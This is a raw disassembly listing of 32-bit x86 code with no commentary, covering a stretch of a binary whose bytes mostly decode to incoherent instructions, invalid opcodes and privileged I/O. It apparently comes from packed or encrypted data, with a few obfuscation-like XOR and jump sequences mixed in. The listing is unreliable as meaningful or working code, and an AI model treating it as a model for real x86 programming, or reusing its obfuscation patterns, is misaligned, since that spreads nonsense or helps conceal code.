  412fc4:	loope  0x412fd5
  412fc6:	jae    0x412f64
  412fc8:	sar    BYTE PTR [edi],1
  412fca:	mov    dh,0xb4
  412fcc:	push   es
  412fcd:	and    DWORD PTR [ecx+0x59ef215d],esp
  412fd3:	dec    edi
  412fd4:	adc    eax,0xa60d6542
  412fd9:	xor    BYTE PTR [ecx+0x47e1026b],bh
  412fdf:	push   ebp
  412fe0:	mov    bh,0xc
  412fe2:	mov    bl,BYTE PTR [esi+ecx*4-0xc11fb42]
  412fe9:	mov    ecx,DWORD PTR [esi-0x2d1eded0]
  412fef:	mov    cl,0x64
  412ff1:	sbb    al,0x37
  412ff3:	rcl    BYTE PTR [esi+ebp*2],0x39
  412ff7:	sub    eax,0xc75066a1
  412ffc:	add    eax,0xb8d43785
  413001:	and    eax,0x17343618
  413006:	jp     0x412fe3
  413008:	call   0xa1f6:0xb5771d85
  41300f:	xor    ebx,esi
  413011:	jbe    0x413064
  413013:	pusha  
  413014:	popf   
  413015:	mov    ch,0x50
  413017:	jne    0x412fa3
  413019:	rcr    BYTE PTR [edi-0x73acdd7f],1
  41301f:	in     al,0xb
  413021:	xchg   edx,eax
  413022:	das    
  413023:	gs dec esi
  413025:	mov    edx,ss
  413027:	loop   0x412ffb
  413029:	aas    
  41302a:	xchg   ecx,eax
  41302b:	pop    edx
  41302c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41302d:	cmp    dh,dh
  41302f:	and    eax,0x2b64cbe1
  413034:	sub    DWORD PTR [esi+ebx*1],esi
  413037:	jb     0x41308b
  413039:	pop    esp
  41303a:	lea    ecx,ds:0x45f14ebb
  413040:	push   ss
  413041:	or     bh,bh
  413043:	les    esp,FWORD PTR [edi+0x7d]
  413046:	jb     0x412ff7
  413048:	sub    BYTE PTR [ecx+eax*4],0x56
  41304c:	mov    esi,0xaa877695
  413051:	or     esi,ebp
  413053:	mov    ?,WORD PTR [edx+edx*2+0x42412579]
  41305a:	into   
  41305b:	sbb    eax,0x257e15a0
  413060:	pusha  
  413061:	clc    
  413062:	fsubr  DWORD PTR [eax-0x23d7540c]
  413068:	and    edx,DWORD PTR [ecx-0x2231a687]
  41306e:	mov    edx,0x39cefca4
  413073:	sbb    al,0x6e
  413075:	inc    ebx
  413076:	shr    BYTE PTR [eax-0x218f2804],1
  41307c:	adc    eax,0x9ca589fa
  413081:	mov    esp,cs
  413083:	popa   
  413084:	rcl    al,0x12
  413087:	and    DWORD PTR [ecx+0xa],ebx
  41308a:	stc    
  41308b:	cmp    DWORD PTR [edi],edi
  41308d:	pushw  ss
  41308f:	sub    BYTE PTR [eax-0x17c0e425],0x4d
  413096:	jno    0x413020
  413098:	sbb    BYTE PTR [bp+si],ch
  41309b:	lods   al,BYTE PTR ds:[esi]
  41309c:	cmp    esp,ecx
  41309e:	aas    
  41309f:	(bad)  
  4130a0:	lods   al,BYTE PTR ds:[esi]
  4130a1:	inc    edi
  4130a2:	daa    
  4130a3:	pop    edx
  4130a4:	pop    es
  4130a5:	mov    edx,0x906d78b7
  4130aa:	(bad)  
  4130ab:	push   edx
  4130ac:	cmp    BYTE PTR [ebx-0x453ee416],ah
  4130b2:	push   ebp
  4130b3:	dec    esp
  4130b4:	jb     0x4130ed
  4130b6:	pop    ebx
  4130b7:	cmp    eax,0xc107470b
  4130bc:	in     al,dx
  4130bd:	leave  
  4130be:	mov    al,0xb1
  4130c0:	cmp    ebp,ecx
  4130c2:	ja     0x4130af
  4130c4:	xchg   BYTE PTR [esi+0x26],ah
  4130c7:	sub    ebp,DWORD PTR [eax+0x1c]
  4130ca:	push   edx
  4130cb:	rcl    dh,cl
  4130cd:	add    BYTE PTR [ebp*8-0xfb3180d],dh
  4130d4:	sahf   
  4130d5:	xchg   ebp,eax
  4130d6:	push   ecx
  4130d7:	icebp  
  4130d8:	inc    ecx
  4130d9:	addr16 inc ebp
  4130db:	or     eax,0x59bffa8e
  4130e0:	shr    DWORD PTR [ecx+0x56a6413f],1
  4130e6:	sub    DWORD PTR [eax],ebp
  4130e8:	mov    bl,0x55
  4130ea:	mov    ah,0x38
  4130ec:	pop    edx
  4130ed:	outs   dx,BYTE PTR ds:[esi]
  4130ee:	addr16 enter 0xf964,0x6b
  4130f3:	pop    edx
  4130f4:	pop    ebx
  4130f5:	cmp    eax,0xb78796fc
  4130fa:	mov    ds,WORD PTR [ebx]
  4130fc:	and    ebp,DWORD PTR [eax+ebp*8]
  4130ff:	sti    
  413100:	aam    0x52
  413102:	sub    dl,BYTE PTR [eax+0xf175c5b]
  413108:	xchg   ebx,eax
  413109:	loopne 0x4130ee
  41310b:	das    
  41310c:	xor    al,0x72
  41310e:	mov    es,WORD PTR [eax]
  413110:	inc    ecx
  413111:	push   edx
  413112:	sbb    cl,BYTE PTR [ebp+0x353e591e]
  413118:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413119:	mov    esp,0x908dcc23
  41311e:	add    edx,0xffffffd5
  413121:	mov    ds,WORD PTR ds:0x2b205f6c
  413127:	adc    DWORD PTR [esi+0x516d7143],esp
  41312d:	sub    BYTE PTR [esi-0x10818f51],ah
  413133:	call   0x91e9:0x1d306514
  41313a:	dec    ebx
  41313b:	iret   
  41313c:	(bad)  
  41313e:	xor    eax,DWORD PTR [esi+0x54]
  413141:	mov    bh,0x89
  413143:	sahf   
  413144:	jl     0x41315d
  413146:	das    
  413147:	mov    eax,0x89d87589
  41314c:	jne    0x413122
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	mov    WORD PTR [edi],es
  413180:	mov    esi,0x7061a340
  413185:	jo     0x413140
  413187:	jle    0x4131f9
  413189:	jo     0x4131e0
  41318b:	neg    BYTE PTR [esp+edi*4]
  41318e:	and    eax,0xcc137714
  413193:	sahf   
  413194:	retf   0xb5dc
  413197:	inc    ebx
  413198:	int3   
  413199:	sbb    al,0xe0
  41319b:	stos   DWORD PTR es:[edi],eax
  41319c:	pop    edi
  41319d:	hlt    
  41319e:	int3   
  41319f:	in     al,dx
  4131a0:	lods   eax,DWORD PTR ds:[esi]
  4131a1:	loop   0x4131cf
  4131a3:	sub    BYTE PTR [eax-0x3d],dh
  4131a6:	mov    DWORD PTR [esi],esp
  4131a8:	mov    ds:0x951f056b,al
  4131ad:	js     0x4131a2
  4131af:	rcl    DWORD PTR [esi+0x26b2598b],cl
  4131b5:	retf   
  4131b6:	aam    0xe3
  4131b8:	push   eax
  4131b9:	cmp    BYTE PTR [eax+0x2b],bh
  4131bc:	sbb    edi,DWORD PTR [ecx]
  4131be:	xor    eax,0x86545b5b
  4131c3:	mov    bl,BYTE PTR [ecx+0x1c]
  4131c6:	push   eax
  4131c7:	sbb    DWORD PTR [edx],ecx
  4131c9:	fs jmp 0x34ad:0x56d72e61
  4131d1:	jae    0x413186
  4131d3:	mov    dh,0x3f
  4131d5:	sar    BYTE PTR [ecx+eax*1+0x63],0x30
  4131da:	aaa    
  4131db:	shl    BYTE PTR fs:[edi+ebp*2-0x5],cl
  4131e0:	pushf  
  4131e1:	add    DWORD PTR [edi+0x60af648f],ebp
  4131e7:	idiv   DWORD PTR [ebp+0x26c4e7d9]
  4131ed:	mov    dl,0xe1
  4131ef:	inc    esi
  4131f0:	shl    BYTE PTR [ebp-0x56a71206],cl
  4131f6:	xchg   esp,eax
  4131f7:	inc    ecx
  4131f8:	shl    DWORD PTR [edx+0x27d8b18b],0x79
  4131ff:	adc    BYTE PTR [eax+edx*1],al
  413202:	jnp    0x4131f8
  413204:	js     0x413227
  413206:	inc    edx
  413207:	cmp    al,0xf7
  413209:	scas   al,BYTE PTR es:[edi]
  41320a:	mov    bh,0x8
  41320c:	adc    ch,BYTE PTR [ebp-0x23]
  41320f:	sbb    DWORD PTR [esi-0x302dcdc3],esp
  413215:	mov    eax,ds:0x1a896710
  41321a:	(bad)  
  41321b:	and    BYTE PTR fs:[eax],0xb5
  41321f:	in     al,dx
  413220:	xor    al,0x8b
  413222:	out    dx,eax
  413223:	sahf   
  413224:	ficom  WORD PTR ss:[ebp+esi*4-0x715d0087]
  41322c:	adc    BYTE PTR [esi-0x707be656],al
  413232:	repnz (bad) 
  413234:	push   edi
  413235:	lods   eax,DWORD PTR ds:[esi]
  413236:	push   ss
  413237:	clc    
  413238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413239:	test   ah,0xbd
  41323c:	lahf   
  41323d:	jb     0x4131e4
  41323f:	(bad)  
  413240:	sbb    ebx,DWORD PTR [edx+0x4e]
  413243:	aad    0x15
  413245:	retf   
  413246:	dec    edx
  413247:	lock out 0xb0,eax
  41324a:	and    ch,ch
  41324c:	popa   
  41324d:	(bad)  
  41324e:	(bad)  
  41324f:	jmp    0x23b5ce7a
  413254:	test   al,0xaf
  413256:	dec    ecx
  413257:	cli    
  413258:	inc    edi
  413259:	xchg   edx,eax
  41325a:	mov    ch,0x4a
  41325c:	test   BYTE PTR [esi],dh
  41325e:	sub    dh,BYTE PTR [esi+0x42bb04e1]
  413264:	imul   edi,DWORD PTR [edx+0x32],0x7d
  413268:	adc    al,0x73
  41326a:	sub    DWORD PTR [eax-0x6d4dae8],0x45
  413271:	push   es
  413272:	jnp    0x413297
  413274:	mov    ebp,0xaf593419
  413279:	jb     0x413209
  41327b:	sub    eax,0xed40e811
  413280:	cs aam 0x6c
  413283:	imul   ecx,edx,0xffffffc9
  413286:	rol    bl,1
  413288:	cld    
  413289:	mov    bh,0x10
  41328b:	push   cs
  41328c:	cmp    eax,esp
  41328e:	addr16 mov ch,0x26
  413291:	xor    eax,0xab993f91
  413296:	pop    esp
  413297:	mov    ch,0x5d
  413299:	loopne 0x4132d5
  41329b:	stos   BYTE PTR es:[edi],al
  41329c:	fwait
  41329d:	mov    DWORD PTR [ecx+0x3dd3ab05],eax
  4132a3:	mov    ch,0xe5
  4132a5:	scas   eax,DWORD PTR es:[edi]
  4132a6:	or     DWORD PTR [edx-0x3c],eax
  4132a9:	add    al,0x1c
  4132ab:	jp     0x413251
  4132ad:	pushf  
  4132ae:	les    ebx,FWORD PTR ds:0x7fde412f
  4132b4:	adc    BYTE PTR ds:[esi+0x6a2679b8],0x42
  4132bc:	iret   
  4132bd:	cdq    
  4132be:	cmp    eax,0x57fe3b62
  4132c3:	jno    0x4132ce
  4132c5:	fdivr  st(4),st
  4132c7:	sbb    BYTE PTR [ebp+0x3396fdfa],dl
  4132cd:	les    ecx,FWORD PTR [ebx+0x247ad831]
  4132d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132d4:	sbb    al,0x82
  4132d6:	test   BYTE PTR ss:[edi],cl
  4132d9:	jne    0x413330
  4132db:	adc    al,0x9e
  4132dd:	popa   
  4132de:	test   edx,esp
  4132e0:	push   ebp
  4132e1:	pop    DWORD PTR [edx]
  4132e3:	push   ecx
  4132e4:	imul   esi,DWORD PTR [ecx+0x747665e0],0x3e7a2f1c
  4132ee:	cli    
  4132ef:	xor    eax,0x33d9fd30
  4132f4:	jg     0x413343
  4132f6:	push   eax
  4132f7:	aam    0x3e
  4132f9:	xor    al,0x41
  4132fb:	fwait
  4132fc:	mov    fs,ecx
  4132fe:	push   ds
  4132ff:	out    dx,eax
  413300:	adc    al,0x0
  413302:	bound  ebx,QWORD PTR [eax+0x3e]
  413305:	pop    ecx
  413306:	pop    ds
  413307:	cmp    al,0x95
  413309:	inc    eax
  41330a:	add    bl,BYTE PTR [ebx]
  41330c:	push   ebx
  41330d:	mov    dl,0xe2
  41330f:	imul   esp
  413311:	and    eax,0x3407f8b8
  413316:	push   ebx
  413317:	out    dx,al
  413318:	and    dh,bh
  41331a:	jns    0x41330e
  41331c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41331d:	add    al,0x8a
  41331f:	icebp  
  413320:	pop    ebx
  413321:	test   DWORD PTR [ebp-0x2ee7e255],ecx
  413327:	fiadd  WORD PTR [ecx+0x78031a92]
  41332d:	in     al,dx
  41332e:	data16 lahf 
  413330:	pop    ss
  413331:	mov    ecx,0x3f561a38
  413336:	daa    
  413337:	and    ebx,DWORD PTR [edx+edx*1]
  41333a:	and    ch,BYTE PTR [ecx-0x2a]
  41333d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41333e:	iret   
  41333f:	ins    DWORD PTR es:[edi],dx
  413340:	js     0x413366
  413342:	sub    esi,0x6f
  413345:	daa    
  413346:	in     eax,dx
  413347:	jmp    0x1dd2:0xcdd9f055
  41334e:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  413350:	retf   0x1b0e
  413353:	imul   ebx,DWORD PTR [ebx],0x33
  413356:	fdivr  st(5),st
  413358:	and    ah,BYTE PTR [ecx]
  41335a:	nop
  41335b:	push   0xffffffd6
  41335d:	out    dx,eax
  41335e:	xlat   BYTE PTR ds:[ebx]
  41335f:	mov    dh,ch
  413361:	dec    eax
  413362:	mov    ecx,0xb7648082
  413367:	fs (bad) 
  413369:	mov    edx,0xecb85be5
  41336e:	rol    BYTE PTR [ecx],0xef
  413371:	icebp  
  413372:	sbb    eax,0x2101212f
  413377:	imul   DWORD PTR ds:0xd2f092a0
  41337d:	push   es
  41337e:	add    eax,0xcda46ae4
  413383:	icebp  
  413384:	retf   
  413385:	clc    
  413386:	repnz sub bh,dh
  413389:	or     DWORD PTR [edi],edi
  41338b:	fs add eax,0xa1d4120c
  413391:	add    ebp,edx
  413393:	loop   0x413374
  413395:	mov    cl,0x9
  413397:	or     edi,DWORD PTR [edi+0x28ddd3dd]
  41339d:	sbb    al,0x9a
  41339f:	clc    
  4133a0:	fcmovb st,st(2)
  4133a2:	les    ebp,FWORD PTR [edi+0x11]
  4133a5:	pop    edi
  4133a6:	or     ebx,edx
  4133a8:	jnp    0x4133df
  4133aa:	push   ebp
  4133ab:	sub    edx,ebp
  4133ad:	xchg   esp,eax
  4133ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133af:	mov    edx,0xcdda911a
  4133b4:	push   edi
  4133b5:	mov    edx,0x1e6b7228
  4133ba:	retf   
  4133bb:	popa   
  4133bc:	div    esp
  4133be:	or     al,BYTE PTR [esi+0x48]
  4133c1:	cld    
  4133c2:	push   esi
  4133c3:	iret   
  4133c4:	jmp    0x41338c
  4133c6:	fwait
  4133c7:	cmp    al,0xa
  4133c9:	test   DWORD PTR [esi-0x1c],ecx
  4133cc:	fnstsw WORD PTR [ebp-0x22f277f5]
  4133d2:	cdq    
  4133d3:	mov    ecx,DWORD PTR [ebx-0x19a210f9]
  4133d9:	push   ss
  4133da:	addr16 push ebp
  4133dc:	stc    
  4133dd:	sub    al,0xae
  4133df:	push   es
  4133e0:	inc    ebx
  4133e1:	lds    edi,FWORD PTR [ebx-0x52]
  4133e4:	loope  0x413366
  4133e6:	test   al,0x28
  4133e8:	(bad)  
  4133e9:	sub    DWORD PTR [ebp-0x22],0x3f
  4133ed:	call   0x6d89:0xc18713
  4133f4:	inc    eax
  4133f5:	add    esp,DWORD PTR [ebx-0x2fc2267a]
  4133fb:	sbb    DWORD PTR ds:0x1b2032d3,esi
  413401:	inc    ebp
  413402:	push   cs
  413403:	imul   esi,esp,0x61
  413406:	mov    ch,0xc4
  413408:	jo     0x41338a
  41340a:	push   ss
  41340b:	cld    
  41340c:	mov    esp,0xca47ea6f
  413411:	nop
  413412:	bound  ecx,QWORD PTR [edx+0x5f]
  413415:	inc    ecx
  413416:	scas   al,BYTE PTR es:[edi]
  413417:	jne    0x413450
  413419:	enter  0xf737,0xb3
  41341d:	mov    ch,BYTE PTR [ebp+0x4529f17c]
  413423:	xchg   BYTE PTR [ebp+ebx*8-0xca5a013],ah
  41342a:	(bad)  
  41342b:	adc    eax,0x77d902ca
  413430:	ss (bad) 
  413432:	imul   ebx,esi,0x26e1c58a
  413438:	gs enter 0x5992,0xdf
  41343d:	pop    ebx
  41343e:	arpl   WORD PTR [esp+edx*1+0x5],ax
  413442:	call   0x2888:0xc03e205e
  413449:	dec    ecx
  41344a:	pop    eax
  41344b:	test   al,0x7a
  41344d:	sbb    BYTE PTR [esi-0x34fcc520],cl
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0xbaef6c0f,al
  413492:	xchg   esp,ebp
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x8f70707e
  41349c:	cmp    al,BYTE PTR [eax-0x36c11e62]
  4134a2:	in     eax,dx
  4134a3:	jo     0x4134ed
  4134a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134a6:	scas   al,BYTE PTR es:[edi]
  4134a7:	and    al,0xfb
  4134a9:	or     eax,0x8569b615
  4134ae:	pop    eax
  4134af:	or     edi,ecx
  4134b1:	call   0x433b28af
  4134b6:	sbb    eax,0x5abfd78d
  4134bb:	ins    BYTE PTR es:[edi],dx
  4134bc:	push   0xffffffe4
  4134be:	mov    edi,DWORD PTR [ebp-0x5e9c38ee]
  4134c4:	mov    eax,0x74e01427
  4134c9:	add    ch,BYTE PTR [esi]
  4134cb:	cld    
  4134cc:	jp     0x413453
  4134ce:	gs ja  0x41349a
  4134d1:	pusha  
  4134d2:	xor    al,0x40
  4134d4:	mov    eax,0xf682b638
  4134d9:	lea    edx,[ecx+0x61]
  4134dc:	out    dx,eax
  4134dd:	icebp  
  4134de:	pop    ss
  4134df:	out    0x28,eax
  4134e1:	push   eax
  4134e2:	jmp    0xc1f3:0x8b69c6bc
  4134e9:	and    esp,ebx
  4134eb:	adc    DWORD PTR [edi-0x30ce4e7b],edx
  4134f1:	pushf  
  4134f2:	jle    0x413557
  4134f4:	or     esp,DWORD PTR [esi]
  4134f6:	pop    esi
  4134f7:	or     eax,0x67e593de
  4134fc:	adc    ebp,esp
  4134fe:	fisttp QWORD PTR [edx+0x5344bb99]
  413504:	out    0x5e,al
  413506:	cmp    eax,0x3c550ca6
  41350b:	out    dx,eax
  41350c:	push   ecx
  41350d:	push   0x21920648
  413512:	xor    DWORD PTR [eax-0x6e3a52ce],edi
  413518:	mov    esp,0x5e5654a
  41351d:	sub    DWORD PTR [ecx-0x56],0x7fbac982
  413524:	scas   al,BYTE PTR es:[edi]
  413525:	or     al,0x29
  413527:	mov    ah,0x54
  413529:	test   DWORD PTR [ecx-0x48],ebx
  41352c:	lds    ebp,FWORD PTR [ebx]
  41352e:	ins    DWORD PTR es:[edi],dx
  41352f:	stos   DWORD PTR es:[edi],eax
  413530:	dec    ebp
  413531:	jae    0x413576
  413533:	sti    
  413534:	jo     0x4134bd
  413536:	xchg   esi,eax
  413537:	lods   eax,DWORD PTR ds:[esi]
  413538:	fist   DWORD PTR [edi]
  41353a:	fnstenv [edi+0x29]
  41353d:	mov    ebx,0xace791f
  413542:	dec    edi
  413543:	stc    
  413544:	mov    ah,dl
  413546:	push   ss
  413547:	js     0x4134f1
  413549:	push   edx
  41354a:	xchg   ebx,eax
  41354b:	dec    ebx
  41354c:	cmp    al,0x8b
  41354e:	xchg   ecx,eax
  41354f:	mov    eax,0x3791f7a6
  413554:	mov    al,0x38
  413556:	and    BYTE PTR [ebp+ebx*8-0x13],cl
  41355a:	cmp    al,0xef
  41355c:	push   esp
  41355d:	push   es
  41355e:	out    0xdf,eax
  413560:	xor    BYTE PTR [ecx-0x35aced4e],cl
  413566:	daa    
  413567:	in     eax,0x6b
  413569:	test   eax,0x36c4d153
  41356e:	pop    eax
  41356f:	jl     0x4135dd
  413571:	or     al,0x7d
  413573:	in     eax,0xd2
  413575:	xor    BYTE PTR [edx+0x51eff411],bl
  41357b:	daa    
  41357c:	(bad)  
  41357d:	and    eax,0xfcbc346f
  413582:	xchg   BYTE PTR [esi],dl
  413584:	and    eax,0xffffff82
  413587:	gs (bad) 
  413589:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41358b:	mov    ebx,0xecfdf5a9
  413590:	(bad)  
  413591:	cdq    
  413592:	jp     0x41360b
  413594:	test   BYTE PTR [ebp+0x7f3b50ca],ch
  41359a:	stc    
  41359b:	stos   DWORD PTR es:[edi],eax
  41359c:	add    cl,ch
  41359e:	fnsave [eax]
  4135a0:	das    
  4135a1:	adc    al,0xf2
  4135a3:	cmp    eax,0xf1f8280b
  4135a8:	ss dec ecx
  4135aa:	outs   dx,DWORD PTR ds:[esi]
  4135ab:	jecxz  0x413559
  4135ad:	pop    ebp
  4135ae:	dec    eax
  4135af:	in     eax,dx
  4135b0:	xchg   edi,eax
  4135b1:	mov    ebp,DWORD PTR [esi-0x5b]
  4135b4:	ficom  WORD PTR [ebp-0xf1b43e2]
  4135ba:	pop    ecx
  4135bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4135bc:	nop
  4135bd:	mov    BYTE PTR [edx+0x6ad18a7b],bl
  4135c3:	sub    ebx,DWORD PTR [ebp+0x756d9079]
  4135c9:	(bad)  
  4135ca:	sbb    DWORD PTR [edx-0x7c41a8ea],edi
  4135d0:	popf   
  4135d1:	cmc    
  4135d2:	repnz push edi
  4135d4:	sub    ebp,edi
  4135d6:	arpl   WORD PTR [ebx],cx
  4135d8:	mov    bl,0xd8
  4135da:	aam    0xc6
  4135dc:	scas   al,BYTE PTR es:[edi]
  4135dd:	adc    al,0x3c
  4135df:	icebp  
  4135e0:	neg    BYTE PTR [ecx+0x8]
  4135e3:	mov    ch,0xfd
  4135e5:	add    eax,0x36f4e1f6
  4135ea:	push   ebp
  4135eb:	loopne 0x4135a3
  4135ed:	je     0x4135e4
  4135ef:	scas   eax,DWORD PTR es:[edi]
  4135f0:	push   ecx
  4135f1:	sbb    BYTE PTR ds:0xced4daa1,cl
  4135f7:	sub    BYTE PTR [ebp+0x247e4987],bl
  4135fd:	jo     0x4135d7
  4135ff:	pop    esp
  413600:	mov    ebx,0x28c103d0
  413605:	dec    edx
  413606:	mov    BYTE PTR [ebx],0x43
  413609:	pop    es
  41360a:	ror    BYTE PTR [ebp+0x26],0xed
  41360e:	je     0x4135e0
  413610:	sub    al,0xd9
  413612:	inc    edi
  413613:	cmp    eax,0xbb4f7e8
  413618:	int    0x5
  41361a:	test   BYTE PTR [ebp-0x80],al
  41361d:	aam    0x61
  41361f:	mov    edi,0xa0c28bfa
  413624:	mov    BYTE PTR [ecx+0x3b6067c2],ch
  41362a:	call   0x852e:0x609fc0ad
  413631:	adc    al,0xa3
  413633:	cmp    ah,0xca
  413636:	mov    ch,0x85
  413638:	ins    DWORD PTR es:[edi],dx
  413639:	les    ebx,FWORD PTR [ebx+eax*2+0xd114faa]
  413640:	and    dh,BYTE PTR [esi+ebx*2-0x7]
  413644:	ins    BYTE PTR es:[edi],dx
  413645:	sbb    BYTE PTR [ebx],dl
  413647:	sbb    eax,esi
  413649:	dec    ecx
  41364a:	popa   
  41364b:	leave  
  41364c:	mov    ds:0xcc87e04a,eax
  413651:	mov    edx,0xaef9e3ef
  413656:	lods   eax,DWORD PTR ds:[esi]
  413657:	imul   eax,esp,0x48eabc1
  41365d:	fwait
  41365e:	les    ebp,FWORD PTR [ecx]
  413660:	sbb    BYTE PTR [edi-0x32],bl
  413663:	retf   0xe819
  413666:	pop    edx
  413667:	in     al,dx
  413668:	aam    0x1e
  41366a:	outs   dx,DWORD PTR ds:[esi]
  41366b:	and    al,0xb6
  41366d:	pushaw 
  41366f:	stos   DWORD PTR es:[edi],eax
  413670:	pop    edi
  413671:	jge    0x413617
  413673:	(bad)  
  413674:	enter  0xfe47,0xd8
  413678:	ss push cs
  41367a:	ja     0x413629
  41367c:	push   eax
  41367d:	or     DWORD PTR [ecx+0x29812d66],ecx
  413683:	nop
  413684:	cmp    edi,DWORD PTR [ebx-0x3a]
  413687:	(bad)  
  413688:	jle    0x4136ce
  41368a:	or     bl,BYTE PTR [eax-0x48]
  41368d:	push   0xfffffff2
  41368f:	aad    0x85
  413691:	out    0x7e,al
  413693:	pusha  
  413694:	imul   edx,esp,0xffffffb9
  413697:	inc    ecx
  413698:	and    BYTE PTR [esi+0x7e],ah
  41369b:	pop    esp
  41369c:	mov    esi,0x251a8534
  4136a1:	retf   0xf76c
  4136a4:	popa   
  4136a5:	scas   al,BYTE PTR es:[edi]
  4136a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136a7:	mov    bh,0x79
  4136a9:	mov    esp,ebp
  4136ab:	add    BYTE PTR [eax+0x47],dl
  4136ae:	cld    
  4136af:	cmp    edi,DWORD PTR [edi+esi*2]
  4136b2:	mov    bl,0x53
  4136b4:	out    dx,eax
  4136b5:	lds    ebx,FWORD PTR [edx-0x2a]
  4136b8:	sbb    eax,0x2f522c89
  4136bd:	mov    bl,0xc2
  4136bf:	pop    esp
  4136c0:	sub    DWORD PTR [ebp+0x3b6f0ef8],edx
  4136c6:	rol    BYTE PTR [edi+edx*1+0x1d],1
  4136ca:	cmp    eax,0xce424cf5
  4136cf:	sbb    DWORD PTR [ebx],ebx
  4136d1:	test   dl,bl
  4136d3:	out    0x95,al
  4136d5:	cmp    eax,DWORD PTR [esp+eiz*8-0x34]
  4136d9:	mul    BYTE PTR [esp+edi*2-0x60]
  4136dd:	test   DWORD PTR [ecx-0x6a],edx
  4136e0:	pushf  
  4136e1:	dec    eax
  4136e2:	jge    0x41369b
  4136e4:	rcr    esp,1
  4136e6:	sub    cl,dl
  4136e8:	es add al,0xe5
  4136eb:	sbb    eax,DWORD PTR [ebp+0x688eb6e0]
  4136f1:	outs   dx,BYTE PTR ds:[esi]
  4136f2:	fwait
  4136f3:	pop    edi
  4136f4:	jp     0x4136c5
  4136f6:	es xchg si,ax
  4136f9:	mov    esi,0xd318c955
  4136fe:	mov    esp,0x7b4006f7
  413703:	or     BYTE PTR [ebx+eax*8],bh
  413706:	stos   DWORD PTR es:[edi],eax
  413707:	xlat   BYTE PTR ds:[ebx]
  413708:	and    eax,0x9dd52d53
  41370d:	je     0x4136c3
  41370f:	aas    
  413710:	mov    bh,0x3a
  413712:	(bad)  
  413713:	pop    es
  413714:	or     BYTE PTR [esi-0x58ef3843],ch
  41371a:	push   ds
  41371b:	or     al,BYTE PTR [edx+0x47]
  41371e:	shl    DWORD PTR [ebp-0x7155a8e4],1
  413724:	xchg   edi,eax
  413725:	shr    al,0x14
  413728:	adc    al,0x7
  41372a:	jnp    0x4136c3
  41372c:	loop   0x413701
  41372e:	inc    esp
  41372f:	js     0x41374e
  413731:	scas   eax,DWORD PTR es:[edi]
  413732:	into   
  413733:	fiadd  WORD PTR [ebx]
  413735:	push   edx
  413736:	repnz ds out dx,al
  413739:	jg     0x4136d2
  41373b:	add    edx,ebp
  41373d:	fcomp  st(4)
  41373f:	and    BYTE PTR [ebp+0x51],0x39
  413743:	cmp    BYTE PTR [esp+eax*1],ah
  413746:	dec    ebx
  413747:	push   es
  413748:	lods   eax,DWORD PTR ds:[esi]
  413749:	jne    0x4136ef
  41374b:	add    BYTE PTR fs:[eax+0x41f4439b],bh
  413752:	pusha  
  413753:	sub    al,0xd8
  413755:	cmc    
  413756:	or     ecx,ebx
  413758:	or     eax,0x669a9925
  41375d:	jmp    0x413778
  41375f:	lds    esi,FWORD PTR [ebx]
  413761:	idiv   DWORD PTR [ebx]
  413763:	clc    
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	retf   0x3bb9
  413781:	inc    esi
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x413715
  41378b:	or     ebp,edi
  41378d:	rcl    DWORD PTR [edx-0x1d],0xcf
  413791:	xor    esi,DWORD PTR ds:0x413d6626
  413797:	adc    eax,0xec9c6536
  41379c:	stos   DWORD PTR es:[edi],eax
  41379d:	add    al,0x5c
  41379f:	test   DWORD PTR [ebp+0x4f621b4c],ebp
  4137a5:	test   ebx,0x5c321eaa
  4137ab:	stos   BYTE PTR es:[edi],al
  4137ac:	mov    bh,0x85
  4137ae:	pop    ebp
  4137af:	call   0xbad0ba21
  4137b4:	mov    edx,0xd7e314be
  4137b9:	jns    0x413827
  4137bb:	fisttp QWORD PTR [ecx-0x5e]
  4137be:	call   DWORD PTR [edi]
  4137c0:	inc    ebx
  4137c1:	mov    dl,0x79
  4137c3:	cs mov ch,0x85
  4137c6:	sub    dl,dl
  4137c8:	imul   eax,DWORD PTR [edx+edx*2+0x2a2148b5],0xffffff88
  4137d0:	inc    esp
  4137d1:	repz push es
  4137d3:	repz mov al,0x61
  4137d6:	fnstsw WORD PTR [ecx+0x7e3ced07]
